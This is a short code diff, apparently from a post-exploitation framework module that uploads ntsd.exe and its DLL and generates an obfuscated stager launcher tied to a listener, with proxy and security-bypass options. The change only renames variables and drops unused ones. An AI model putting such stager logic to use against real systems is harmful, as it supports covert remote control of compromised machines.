@@ -24,11 +24,6 @@ class Module(object):
         ntsd_exe_upload_path = upload_path + "\\" + "ntsd.exe"
         ntsd_dll_upload_path = upload_path + "\\" + "ntsdexts.dll"
 
-        # staging options
-        user_agent = params["UserAgent"]
-        proxy = params["Proxy"]
-        proxy_creds = params["ProxyCreds"]
-
         if arch == "x64":
             ntsd_exe = (
                 main_menu.installPath
@@ -64,20 +59,20 @@ class Module(object):
             return handle_error_message("[!] Invalid listener: %s" % (listener_name))
         else:
 
-            l = main_menu.stagertemplatesv2.new_instance("multi_launcher")
-            l.options["Listener"] = params["Listener"]
-            l.options["UserAgent"] = params["UserAgent"]
-            l.options["Proxy"] = params["Proxy"]
-            l.options["ProxyCreds"] = params["ProxyCreds"]
-            l.options["Obfuscate"] = params["Obfuscate"]
-            l.options["ObfuscateCommand"] = params["ObfuscateCommand"]
-            l.options["Bypasses"] = params["Bypasses"]
-            launcher = l.generate()
+            multi_launcher = main_menu.stagertemplatesv2.new_instance("multi_launcher")
+            multi_launcher.options["Listener"] = params["Listener"]
+            multi_launcher.options["UserAgent"] = params["UserAgent"]
+            multi_launcher.options["Proxy"] = params["Proxy"]
+            multi_launcher.options["ProxyCreds"] = params["ProxyCreds"]
+            multi_launcher.options["Obfuscate"] = params["Obfuscate"]
+            multi_launcher.options["ObfuscateCommand"] = params["ObfuscateCommand"]
+            multi_launcher.options["Bypasses"] = params["Bypasses"]
+            launcher = multi_launcher.generate()
 
             if launcher == "":
                 return handle_error_message("[!] Error in launcher generation.")
             else:
-                launcher_code = launcher.split(" ")[-1]
+                launcher = launcher.split(" ")[-1]
 
                 with open(ntsd_exe, "rb") as bin_data:
                     ntsd_exe_data = bin_data.read()
